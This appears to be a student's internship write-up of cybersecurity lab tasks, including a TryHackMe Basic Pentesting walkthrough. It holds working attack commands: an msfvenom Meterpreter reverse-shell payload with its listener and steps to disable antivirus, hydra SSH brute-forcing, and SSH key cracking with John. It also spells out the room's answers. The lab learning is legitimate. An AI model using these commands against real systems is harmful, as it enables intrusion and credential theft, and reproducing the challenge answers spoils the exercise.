@@ -1,0 +1,259 @@
+Beginner 
+
+1. Find all the ports that are open on the website http://testphp.vulnweb.com/ 
+
+- Started Parrot Virtual Machine and visited the website to view it 
+- To get the ip address of the website i try pinging it using - ping http://testphp.vulnweb.com/ 
+- got the ip address : 44.228.249.3  
+- to get the open ports on the website i am using nmap tool which is used to discover hosts and services on a computer network by sending packets and analyzing the responses. 
+- i use the command : nmap -sT -Pn 44.228.249.3 ;where -sT: Performs a TCP Connect Scan, completing a full TCP handshake to identify open ports on the target, -Pn: Disables the default host discovery (ping scan), assuming the host is online and proceeding directly to scanning. 
+- got the result that only port 80 is opened on the website 
+- this concludes the task 
+
+
+2. Brute force the website http://testphp.vulnweb.com/ and find the directories that are present in the website. 
+
+- to do brute force on the website, i am using dirb tool which is command-line tool used for web content brute-forcing, helping users discover hidden files and directories on web servers by scanning URLs based on a wordlist. 
+- On the parrot machine launch an terminal window and insert the following command : sudo dirb http://testphp.vulnweb.com/ 
+- to use dirb tool you need to have sudo privileges and this tool will use its default wordlist (common.txt) to run the scan against the webiste which is located in : /usr/share/dirb/wordlists/common.txt 
+- got the output which showed that there are directories such as admin, images, secured, etc. on the website 
+- try appending this word in the end of the url and loading the webiste to check if the given output is correct 
+- this concludes the task 
+
+
+3. Make a login in the website http://testphp.vulnweb.com/ and intercept the network traffic using wireshark and find the credentials that were transferred through the network. 
+
+- To intercept the credentials i am using Wireshark tool which is a popular network protocol analyzer that captures and inspects data packets in real-time, aiding in troubleshooting, analysis, and network security monitoring. 
+- On the parrot machine's firefox browser open the website http://testphp.vulnweb.com/ 
+- Click on Signup hyperlink button, followed by "signup here" to register yourself on the portal.  
+- Signup new user page opened. Here, I update my details in the textbox fields with random characters and clicked on Signup. 
+- After signing up on the website, click on Your Profile hyperlink button to login into the website.  
+- before entering credentials, open termnial and type: sudo wireshark ; which will open the wireshark tool with root privilege. 
+- once opened, select 'eth0' which will start capturing the packets on ethernet. 
+- now get back to the browser and enter credentials and click on login button. 
+- now again switch back to wireshark and click on stop capture logo button, this will stop capturing packets further. 
+- click on Analyze button and select <> option to apply filter to search through the packets. 
+- On the Filter tab, first select, Packet Details from the drop down list, and then select Narrorw (UTF-8/ASCII) and finally select string from the list. This is the configuration of the search filter for the string which I want to search in the search box. 
+- In the search box, I try putting multiple strings like, "password", "passwd", "pass", out of which I got successful result using "pass" keyword. 
+- Using the search filter, got the credentials in the plain text in network packets where I found Username and Password successfully. 
+- this concludes the task 
+
+
+Intermediate 
+
+1. A file is encrypted using Veracrypt (A disk encryption tool). The password to access the file is encrypted in a hash format and provided to you in the drive with the name encoded.txt. Decode the password and enter in the vera crypt to unlock the file and find the secret code in it. The veracrypt setup file will be provided to you. 
+
+- Im using my Windows 11 virtual machine for this task 
+- click on the drive link given with the task and download all the files which seems to be in zipped format. 
+- unzip all the files and extract it to a folder and navigate to that folder here we got 2 exe application files and 2 text files. 
+- in the task it is mentioned that the file 'shadowfox veracrypt.txt' is encrypted using Veracrypt so i installed 'VeraCrypt Setup 1.26.7.exe'. 
+- Once installed i try to feel the application to get to know the working of it. 
+- here, there are multiple drive options are available, select any one of them, here i select ' ' and click on select file button to select the encrypted file. 
+- now click on mount button to mount the file, once done i pop up appears asking for password. 
+- in the task it is also mentioned that the passowrd is stored in file 'encoded.txt' in hash format, so i opened the file and copy the hash password. 
+- i open google chrome and search on it for hash to text converter and found many websites and i used : https://crackstation.net/ website to convert the hash passsword into text. 
+- got the plain text password which is : 'password123'. 
+- i insert this password on the popup screen of Veracrypt tool and it works, the selected ' ' drive mounted successfully. 
+- now open the file explorer and click on 'This PC', observe that a the selected ' ' drive is now created. 
+- open the ' ' drive and observe that there is a file named as 'shadowfox cybersecurity' 
+- after opening this file, i got the secret code which is 'never giveup' 
+- this concludes the task 
+
+
+2. An executable file of veracrypt will be provided to you. Find the address of the entry point of the executable using PE explorer tool and provide the value as the answer as a screenshot. 
+
+- Im using my Windows 11 virtual machine for this task 
+- In the previous task i have downloaded the zipped file from the drive link and unzipped it. 
+- install PE explorer tool which will help in finding the entry point of an application 
+- once installed click on 'File' tab option on the top left corner and select 'VeraCrypt Setup 1.26.7.exe'. 
+- once done, all the necessary details of the application will be displayed and here i can find the address of the entry point of the application. 
+- this concludes the task. 
+
+
+3. Create a payload using Metasploit and make a reverse shell connection from a Windows 10 machine in your virtual machine setup. 
+
+- For completion of this task, I am using 2 different virtual machines one as a victim and another as a attacker. Here, attacker machine is Parrot OS and victim machine is Windows 10 OS. Attacker Machine (Parrot OS) IP: Victim / Target Machine (Windows 10) IP:  
+- On the attacker machine, firstly i'll start with creating a payload for which i open a terminal and insert command : sudo su ; and then insert the root user password this will open the terminal with root privileges.  
+- create the payload using command : msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=192.168.101.136 LPORT=444 -o Inter_Task3.exe ; where -p: Specifies the payload type as Meterpreter reverse TCP for Windows. This creates a backdoor that establishes a reverse connection to the listener, --platform: Sets the target platform to Windows, -a: Specifies the architecture as x86 (32-bit), -f: Defines the format of the output file as a Windows executable (.exe), LHOST=192.168.101.136: Sets the local host IP address for the listener that the payload will connect back to, LPORT=444: Specifies the local port for the listener, -o: Indicates the name of the output file where the payload is saved. 
+- once done, an payload is created. 
+- now i need to send this payload to the victim machine, as this is for intership purpose i m acting as both the attacker and victim and can share the payload by any means. 
+- Open the terminal and navigate to the directory where the payload is created, here i'll be using python3 command which creates an http server on the present working directory and it will use default port 8000: python3 -m http.server 
+- Switch to the victim machine and open google chrome and search : http://192.168.101.136:8000 
+- attackers directory will be showed and we can download the payload from here by simply clicking on the payload file name ' '. 
+- before downloading the payload disable all the firewall and real time detection and protection rules by searching 'Windows Security' on the home search button. 
+- once downloaded the payload switch back to attacker machine again. 
+- here we need to start a listener which will listen and will take the session of the victim machine once the victim runs the payload file. 
+- open a terminal and insert command : sudo su ; and then insert the root user password this will open the terminal with root privileges.  
+- now we will use metasploit framework which allows you to perform penetration testing, exploit vulnerabilities, and manage payloads with a range of modules and tools in one integrated environment to start our listener 
+- to start metasplolit framework insert command : msfconsole 
+- i will use exploit as multi/handler using the command: use exploit/multi/handler 
+- now i set the payload which is same as when i created the payload for the victim using command: set payload windows/meterpreter/reverse_tcp 
+- now set the lhost and lport value simultaneously which should also be same as of the payload created earlier, i use command: set LHOST 192.168.101.136 set LPORT 444 
+- in the end to check all the configuration set insert command: show options 
+- to run the listener i insert command : exploit -j where -j specifies to run the exploit in job mode and will run in background. 
+- Switch to victim machine and run the payload , Windows Default Antivirus Protection popup comes, click on 'show details' and then on 'Run anyway'. 
+- Switch back to attackers machine and run command: sessions -i ; which will list the session i have got using the listener if any, and can see one session which is of victim machine. 
+- to use that session i insert command: session -i 1 
+- this will provide me the access of victim machine and now i can run commands on the victim machine. 
+- now to gain command prompt access of the victim machine i insert command: shell 
+- this will open the cmd of the victim machine and now i can perfom any malicious activity. 
+- this concludes the task. 
+
+
+Hard
+
+1. Using the Tryhackme platform, launch the Basic Pentesting room. Penetrate the room and answer all the questions that are given to you on the website and also create a detailed document of the process of penetration and how you did it.
+
+NOTE: For this, i have used my vm not TryHackMe machine
+
+1. Deploy the machine and connect to our network
+
+- open the browser and search for https://tryhackme.com/ and as i'm having my exisiting account here, i try to login into the portal
+- on the home page, click on search option and search for 'Basic Pentesting Room'.
+- join the room by clicking 'Join Room' option and now we can access this room and its vm.
+- Click on 'Access Machine' and then 'Start Attackbox' to access the machine.
+- click on [OpenVPN configuration file](https://tryhackme.com/access) from where we can download configuration file to gain access  of tryhackme network.
+- select 'IN-Regular-1' from the VPN server option to download the configuration file.
+- now we need to install 'openvpn' tool for that, open terminal window and insert window: sudo apt install openvpn
+- once done we need to use this tool and our downloaded configuration file to connect to tryhackme network, in the same terminal insert command: sudo openvpn ~/Downloads/chiragsuthar237.ovpn
+- we are now connected to the tryhackme network, to verify we can try pinging the ip of our tryhackme machine using command: ping 
+- this concludes the task; answer is not needed to put in the answer box.
+
+2. Find the services exposed by the machine
+
+- to get the open services on the website i am using nmap tool which is used to discover hosts and services on a computer network by sending packets and analyzing the responses. 
+- i open an terminal and insert command: nmap -sT 10.10.69.18 ; where -sT: Performs a TCP Connect Scan, completing a full TCP handshake to identify open ports and services on the target
+- 6 open ports and their services are listed
+- this concludes the task; answer is not needed to put in the answer box.
+
+3. What is the name of the hidden directory on the web server(enter name without /)?
+
+- to exploit hidden directory on the server i am using Dirbuster tool which is a directory brute-force tool used in penetration testing to uncover hidden files and folders on web servers.
+- open the Dirbuster tool by clicking on 'Applications' on the top left corner and then expand '03-Web Application Analysis' and then click on 'Web Crawlers & Directory Brutforing' and inside that click on 'dirbuster'.
+- an GUI tool will open, in the 'Target URL' field insert: http://10.10.69.18:80/
+- keep 'Work Method' option as it is
+- increasse the 'Number of Threads' to 100
+- Under 'Select scaning typee' select 'List based brute force' and then click on 'Browse' to slect the wordlist, new pop up appears and navigate to '/usr/share/wordlist/dirbuster/' and select 'directory-list-lowercase-2.3-medium.txt'
+- under 'Select starting options' select 'Standard start point' and also click the checkbox for 'Brute Force Dirs' and 'Be Recursive' and in 'Dir to start with' filed insert: '/'
+- now click on start option to start the directory bruteforcing
+- a new window opens and the tool will use the given wordlist to check for directory and if found it will list out the name of the directory
+- after some time it start giving the output, here we found mutliple directories.
+- i try to insert the ouput which i found from the tool one by one into the answer field of this question and i found the answer which is 'development'
+- this concludes the task.
+
+4. User brute-forcing to find the username & password
+
+- to brute force username and password i am using 3 tools which are smbmap, smbclient and hydra
+- from which smbmap and smbclient are for username brute forcing and hydra is for password brute forcing
+- SMBMap is a tool designed for penetration testers to enumerate and interact with SMB (Server Message Block) shares on a network. It helps identify accessible directories, their permissions, and potential sensitive files.
+- SMBClient is a command-line utility (part of the Samba suite) for accessing and interacting with SMB/CIFS resources. It acts like an FTP client for SMB shares, allowing you to list files, upload, and download them.
+- Hydra is a powerful password-cracking tool that supports numerous protocols, including SMB. It performs brute-force attacks to test multiple username and password combinations on various services.
+- in the next following tasks i will do username and passowrd bruteforcing 
+- this concludes the task; answer is not needed to put in the answer box.
+
+
+5. What is the username?
+
+- to bruteforce username i m using smbmap and smbclient tool
+- first using smbmap tool i wil scan the ip address of my tryhackme target machine to get the available shares on victim machine
+- open termnial and insert command: smbmap -H 10.10.69.18 ; where -H secifies the target host's IP address.
+- got the output that there are 2 shares which are 'Anonymous' and it has 'READ ONLY' permissions
+- to retrieve a detailed directory structure and file list within those shares, i insert command: smbmap -H 10.10.69.18 -R ; where -H secifies the target host's IP address, -R stands for recursive mode it attempts to recursively list all files and directories within accessible SMB shares on the target.
+- got the output, i can now see an extra file named 'staff.txt' 
+- now to read the 'staff.txt' file i need to get access of the 'Anonymous' share fow which i m using smbclient tool
+- to get access of the share i insert command: smbclient \\\\10.10.69.18\\Anonymous
+- it asked for password for which i simply try using my machine's root passowrd and it worked
+- now to get the contents of the 'staff.txt' i try using command: cat staff.txt ;  notepad staff.txt ; type staff.txt ; edit staff.txt ; staff.txt ; but all this command doesn't work
+- now i try using 'get' command which will help me to copy that file from the share to my machine, i insert the command: get staff.txt
+- got the ouput, so i open my downloads folders and found the file 'staff.txt'
+- to read the file, i double click and open it and while reading i saw 2 names - 'Jan' and 'Kay'.
+- i try to insert the name into the answer field of this question and i found the answer which is 'Jan'
+- this concludes the task
+
+
+6. What is the password?
+- to brute force the password of the username 'Jan' , i m using hydra tool
+- to bruteforce password i need worslists 'rockyou.txt' so i navigated to the folder using command: ls /usr/share/wordlist/rockyou.txt
+- got the output that the wordlist is present and next i copy the wordlist file into my desktop folder using command: cp /usr/share/wordlist/rockyou.txt /Desktop/
+- to start the hydra tool i insert commandL: hydra
+- got the output and to further bruteforce password i insert the command: hydra -l jan -P /root/Desktop/rockyou.txt 10.10.159.12 ssh ; where -l specifies the username to test, -P indicates the path to the password file (rockyou.txt), which contains a list of potential passwords, ssh specifies the service to attack, in this case, SSH (Secure Shell).
+- it twill take some time combining all the password combination
+- got the ouput that the password is 'armando'.
+- i try to insert the password into the answer field of this question and i found the answer which is 'armando'
+- this concludes the task
+
+
+7. What service do you use to access the server(answer in abbreviation in all caps)?
+
+- in the earlier steps i found the username and password of the user 'Jan'
+- i use 'ssh' service to gain access of the server
+- to do so, i insert command: ssh jan@10.10.69.18
+- i insert the password 'armando' and got the access of the server.
+- i try to insert the service into the answer field of this question and i found the answer which is 'SSH'
+- this concludes the task
+
+
+8. Enumerate the machine to find any vectors for privilege escalation
+
+- to find all the possible vectors/ways to escalate the privilege i use tool LinEnum which is Linux privilege escalation tool. It automates the process of collecting system details and identifying vulnerabilities for privilege escalation, like misconfigurations, writable files, or outdated software.
+- first i download the tool using command: git clone https://github.com/rebootuser/LinEnum
+- once downloaded i navigate to the folder using command: cd LinEnum   
+- now to securely copy LinEnum.sh script file from the local machine to the '/tmp' directory on the remote machine using the jan account i insert command: scp LinEnum.scp jan@10.10.77.75:/tmp
+- now i access the jan's machine to further exploition using command: ssh jan@10.10.77.75
+- once done, i navigated to the tmp folder and verify that the file copy was successful using command: ls
+- now i run the script using command: ./LinEnum.sh
+- once the script runs it start providing the information with all the details in it which can be helpful in privilege escalation.
+- this concludes the task; answer is not needed to put in the answer box.
+
+
+
+9. What is the name of the other user you found(all lower case)?
+
+- the steps i had done in question 5 gave me the 'staff.txt' file which had 2 names one was 'Jan' and other was 'Kay'
+- i used 'Jan' as username as the answer for the question 5 and it was right 
+- further i now only left with one name which is 'Kay'
+- i try to insert the name into the answer field of this question and i found the answer which is 'Kay'
+- this concludes the task
+
+
+
+10. If you have found another user, what can you do with this information?
+
+- so now i have user 'Kay' also, i first gain access of 'Jan' machine by inserting command: ssh jan@10.10.77.75
+- i then navigate to kay folder using command: cd /home/kay
+- then to list all the files and folders present in the kay's folder i insert command: ls
+- for which i got the output that there is a file present named as 'pass.bak'
+- i usually have a habit to see if there's any hidden files or folders present in the directory, so i insert command: ls -a /home/kay
+- this gave me multiple files and folders which are indeed hidden inside this folder, but i notice that there is a folder named 'ssh' which looks interesting, so i navigate to the folder and list the files inside it
+- i found these files 'authorized_keys', 'id_rsa' and 'id_rsa.pub' which looks like authentication key and encrypted hash keys.
+- now to further find the passowrd i need to decrypt this hash key and then convert hash into plaintext, so for this i m using John the Ripper tool which is a password-cracking tool it works by performing dictionary attacks, brute-force attacks, and it is used for identifying weak passwords
+- for decrypting the file i first copy the contents of 'id_rsa' file and manually created a new file in my own machine and paste it there.
+- now i need to convert the key into john the ripper format so that it is easy to bruteforce the password, i insert the command: python3 /usr/share/john/ssh2john.py id_rsa > rsa_hash.txt
+- to verify if the new 'rsa_hash.txt' file is created i insert command: ls
+- now we have successfully converted the file into john the ripper format, so we use john the ripper tool to bruteforce the password, i insert command: john rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+- it took some seconds and gave the ouput which is 'beeswax' in plaintext, which i m guessing is a password of the user 'kay'
+- so here i was able to successfully crack the passsword of another user 'kay'
+- this concludes the task; answer is not needed to put in the answer box.
+
+
+
+11. What is the final password you obtain?
+
+- for this i m thinking i might get this information from the file which i found in above step i.e 'pass.bak'
+- so to read the content of the file, i try accessing the kay machine using command: ssh kay@10.10.77.75
+- this gave me an error and was not able to access the machine, so i thought of giving 'id_rsa' file as an input to the command so that it would take the private key file as input, so i navigated to the hidden 'ssh' folder and then inserted command: ssh -i id_rsa ssh@10.10.77.75
+- it asked me for passphrase, for which i entered the text which i thought was a passowrd for kay user, so insert: 'beeswax'
+- this runs successfully and gave me access of 'kay' machines
+- now i first verify if the 'pass.bak' file is present or not using command: ls
+- now to read the content of 'pass.bak' file i insert command: cat pass.bak
+- this gave me a really long string, which i thought is a final password that i m looking for
+- i try to insert the string into the answer field of this question and i found the answer which is 'heresareallystrongpasswordthatfollowsthepasswordpolicy$$'
+- this concludes the task
+
+
+- with this i complete the Basic Pentesting Room.
+
+
+
+
+
